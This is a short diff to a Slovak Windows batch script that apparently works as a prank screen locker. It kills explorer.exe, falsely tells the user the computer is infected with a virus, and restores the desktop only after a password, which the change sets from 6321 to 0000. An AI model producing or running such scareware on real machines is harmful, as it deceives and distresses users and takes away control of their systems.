@@ -17,7 +17,7 @@ taskkill /f /im explorer.exe > nul
 echo Váš počítač bol nakazený vírusom,
 echo Ak tento výrus nefunguje kontaktujte Jakuba Zápražného.
 set /p heslo="Zadajte heslo pre odblokovanie výrusu: "
-if %heslo% == 6321 (
+if %heslo% == 0000 (
     cls
     echo Heslo je správne
     explorer
